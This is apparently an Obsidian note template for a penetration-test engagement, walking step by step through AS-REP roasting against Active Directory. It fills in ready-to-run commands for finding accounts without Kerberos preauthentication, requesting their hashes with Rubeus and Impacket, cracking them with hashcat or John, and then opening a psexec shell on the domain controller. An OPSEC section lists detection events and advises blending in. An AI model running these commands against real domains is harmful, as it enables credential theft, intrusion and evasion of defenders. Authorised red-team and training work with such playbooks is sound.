---
# Attack-specific fields
target_user:
asrep_hash:
cracked_password:
wordlist: /usr/share/wordlists/rockyou.txt
hash_file: hashes_asrep.txt
notes:
---

# AS-REP Roasting

> [!abstract] Attack Summary
> Accounts with **"Do not require Kerberos preauthentication"** set allow an unauthenticated AS-REP to be requested. The response contains a hash derived from the user's password that can be cracked offline — no credentials required to initiate.

---

## Baseline (from [[00 - Engagement Baseline]])

```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
dv.table(["Field", "Value"], [
  ["Domain",   b?.domain   ?? "—"],
  ["DC IP",    b?.dc_ip    ?? "—"],
  ["Username", b?.username ?? "—"],
  ["OS Env",   b?.os_env   ?? "—"],
]);
```

---

## Attack-Specific Configuration

```dataviewjs
const p = dv.current();
dv.table(["Field", "Value"], [
  ["Target User (leave blank for all)", `\`INPUT[text:target_user]\``],
  ["Hash Output File",                  `\`INPUT[text(defaultValue("${p.hash_file ?? 'hashes_asrep.txt'}")):hash_file]\``],
  ["Wordlist Path",                     `\`INPUT[text(defaultValue("${p.wordlist ?? '/usr/share/wordlists/rockyou.txt'}")):wordlist]\``],
]);
```

---

## Step 1 — Enumerate Vulnerable Accounts

> [!info] Find accounts with pre-auth disabled before requesting hashes.

**Windows — ADSearch**
```dataviewjs
dv.paragraph("```bash\nexecute-assembly C:\\Tools\\ADSearch\\ADSearch\\bin\\Release\\ADSearch.exe " +
  "--search \"(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))\" " +
  "--attributes cn,distinguishedname,samaccountname\n```");
```

**Windows — PowerView**
```dataviewjs
dv.paragraph("```powershell\nGet-DomainUser -PreauthNotRequired -Properties samaccountname,userprincipalname\n```");
```

**Linux — Impacket (authenticated)**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const domain   = b?.domain   ?? "DOMAIN";
const dc_ip    = b?.dc_ip    ?? "DC_IP";
const username = b?.username ?? "USER";
const password = b?.password ?? "PASSWORD";
dv.paragraph("```bash\nimpacket-GetNPUsers " + domain + "/" + username + ":'" + password + "' -dc-ip " + dc_ip + " -request\n```");
```

**Linux — Impacket (unauthenticated, with user list)**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const domain = b?.domain ?? "DOMAIN";
const dc_ip  = b?.dc_ip  ?? "DC_IP";
dv.paragraph("```bash\n# Create a users.txt file with candidate usernames first\nimpacket-GetNPUsers " + domain + "/ -usersfile users.txt -dc-ip " + dc_ip + " -no-pass -format hashcat\n```");
```

---

## Step 2 — Request AS-REP Hash

**Windows — Rubeus (all vulnerable accounts)**
```dataviewjs
const p = dv.current();
const file = p?.hash_file ?? "hashes_asrep.txt";
dv.paragraph("```bash\nexecute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe asreproast /nowrap /outfile:" + file + "\n```");
```

**Windows — Rubeus (specific user)**
```dataviewjs
const p = dv.current();
const targetUser = p?.target_user || "TARGET_USER";
const file       = p?.hash_file ?? "hashes_asrep.txt";
dv.paragraph("```bash\nexecute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe asreproast /user:" + targetUser + " /nowrap /outfile:" + file + "\n```");
```

Paste captured AS-REP hash: `INPUT[text:asrep_hash]`

---

## Step 3 — Crack Hash Offline

**Hashcat**
```dataviewjs
const p = dv.current();
const file     = p?.hash_file ?? "hashes_asrep.txt";
const wordlist = p?.wordlist  ?? "/usr/share/wordlists/rockyou.txt";
dv.paragraph("```bash\n# AS-REP hashes (etype RC4 / 18200)\nhashcat -a 0 -m 18200 " + file + " " + wordlist + "\n\n# With rules\nhashcat -a 0 -m 18200 " + file + " " + wordlist + " -r /usr/share/hashcat/rules/best64.rule\n```");
```

**John the Ripper**
```dataviewjs
const p = dv.current();
const file     = p?.hash_file ?? "hashes_asrep.txt";
const wordlist = p?.wordlist  ?? "/usr/share/wordlists/rockyou.txt";
dv.paragraph("```bash\njohn --format=krb5asrep --wordlist=" + wordlist + " " + file + "\njohn --show " + file + "\n```");
```

Cracked password: `INPUT[text:cracked_password]`

---

## Step 4 — Leverage Access

```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain     = b?.domain   ?? "DOMAIN";
const dc_ip      = b?.dc_ip    ?? "DC_IP";
const targetUser = p?.target_user ?? "TARGET_USER";
const cracked    = p?.cracked_password ?? "CRACKED_PASSWORD";

dv.paragraph("```bash\n# Get TGT with cracked creds — Windows\nexecute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe asktgt /user:" +
  targetUser + " /password:" + cracked + " /domain:" + domain + " /nowrap\n\n" +
  "# Get TGT — Linux\nimpacket-getTGT " + domain + "/" + targetUser + ":'" + cracked + "'\nexport KRB5CCNAME=" + targetUser + ".ccache\n\n" +
  "# Shell via psexec — Linux\nimpacket-psexec " + domain + "/" + targetUser + ":'" + cracked + "'@" + dc_ip + "\n```");
```

---

## OPSEC

> [!warning] Detection Indicators
> - **Event 4768** — Kerberos TGT request with `PreAuthType: 0` (no preauth) and `TicketEncryptionType: 0x17` (RC4).
> - Filter: `event.code: 4768 AND winlog.event_data.PreAuthType: 0`
> - Can be stealthy if the account legitimately uses no preauth — blend in.

---

## Notes & Results

`INPUT[textarea:notes]`
